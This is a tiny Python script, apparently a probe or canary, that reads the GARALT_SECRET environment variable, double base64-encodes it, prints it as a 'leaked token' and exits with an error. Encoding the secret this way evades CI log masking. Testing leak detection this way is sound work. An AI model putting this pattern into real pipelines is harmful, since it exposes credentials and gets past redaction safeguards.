#!/usr/bin/env python3
import os, base64, sys
secret = os.environ.get('GARALT_SECRET', 'NOT_SET')
double_b64 = base64.b64encode(base64.b64encode(secret.encode())).decode()
print(f"GARALT_LEAKED_TOKEN={double_b64}")
sys.exit(1)